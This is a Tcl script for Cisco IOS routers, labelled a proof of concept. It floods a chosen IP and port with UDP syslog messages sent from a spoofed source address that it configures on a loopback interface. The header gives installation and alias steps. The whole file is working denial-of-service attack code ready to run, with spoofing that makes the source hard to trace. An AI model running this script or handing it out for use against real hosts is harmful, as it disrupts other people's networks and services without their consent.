######################################################################################
#
# simple udp port flooding script
# (proof of concept)
# Version 0.6
# date 14.09.2008
# (c) by packetlevel.ch
#
# 
# ios installation:
#
#     download the file udpflood.tcl into flash:udpflood.tcl
#     configure a alias:  alias exec udpflood tclsh flash:udpflood.tcl
#     execute with: udpflood 
#  
#
# only simple input validation ;-)
#
######################################################################################
#
proc udpflood {} {
puts "UDP flood"
#
# Dest. IP 
#
puts -nonewline "Destination IP:"
flush stdout
set destip [ gets stdin ]
if {![regexp {^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$} $destip]} {
    puts {"Invalid IP Format !"}; 
    return;
  }
#
# Dest Port 1 - 65535
#
puts -nonewline "Destination Port:"
flush stdout
set destport [ gets stdin ]
if {$destport > 65535} {
    puts "port $destport ist out of range !"
    return;
    } 
if {$destport < 1} {
    puts "port $destport ist out of range !"
    return;
    } 
#
# Source IP
#
puts -nonewline "Source IP:"
flush stdout
set srcip [ gets stdin ]
if {![regexp {^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$} $srcip]} {
    puts {"Invalid IP Format !"}; 
    return;
  }
#
# loop cnt.
#
puts -nonewline "Count:"
flush stdout
set count [ gets stdin ]
#
# create source IP with a loopback interface
#
ios_config "interface loopback 999"
set loop "ip address $srcip 255.255.255.255"
ios_config "interface loopback 999" $loop
ios_config "interface loopback 999" "no shutdown"
#
######################################################################################
#
# flooding.... 
#
set ios_cmd "loggin on"
set ios_cmd "logging trap 7"
set ios_cmd "logging host $destip transport udp port $destport"
puts $ios_cmd
ios_config $ios_cmd
ios_config "logging source-interface loopback 999"
set data "Flooding....."
set filename "syslog:"
set fileID [open $filename "w"]
for {set x 0} {$x<$count} {incr x} {
    puts $fileID $data
    flush $fileID
    }
close $fileID
}
#
######################################################################################
#
# main
#
udpflood
